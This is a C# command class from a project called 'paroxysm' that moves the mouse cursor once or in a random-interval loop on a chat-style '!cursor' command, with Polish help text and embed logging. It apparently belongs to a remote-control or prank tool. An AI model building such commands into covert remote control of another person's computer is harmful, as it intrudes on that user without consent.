using paroxysm.API.Commands.Extern;
using paroxysm.Debug;
using paroxysm.Hooks.Actions;
using paroxysm.Tools;

namespace paroxysm.API.Commands;

public class CursorCmd : ICommand
{
    public CommandOptions Options()
    {
        return new CommandOptions
        {
            Name = "cursor",
            Parameters = "{shoot/loop}",
            Description =
                "Zmienia pozycje kursora. Shoot - zmienia raz | loop - Zmienia w nieskończoność póki znów nie zostanie użyte !cursor loop.; Dodaj 'yell' na końcu pętli, by wysyłało wiadomość po każdej zmianie"
        };
    }

    public void Execute(string[]? parameters)
    {
        if (parameters is null || parameters[0].Length <= 0)
        {
            Logger.CreateEmbed(ELoggerState.Error, new Exception("Nie podano parametru"));
            return;
        }
        
        switch (parameters[0])
        {
            case "shoot":
                MoveCursorAction.Follow();
                Logger.CreateEmbed(ELoggerState.Error, new Exception("Ruszono"));
                break;
            case "loop":
            {
                Random random = new();
                Settings.CursorRandom = !Settings.CursorRandom;
                while (Settings.CursorRandom)
                {
                    MoveCursorAction.Follow();
                    Thread.Sleep(random.Next(Settings.CursorMinTime, Settings.CursorMaxTime));
                    if (parameters[1] == "yell") Logger.CreateEmbed(ELoggerState.Error, new Exception("Ruszono"));
                }

                break;
            }
            default:
                MoveCursorAction.Follow();
                break;
        }
    }
}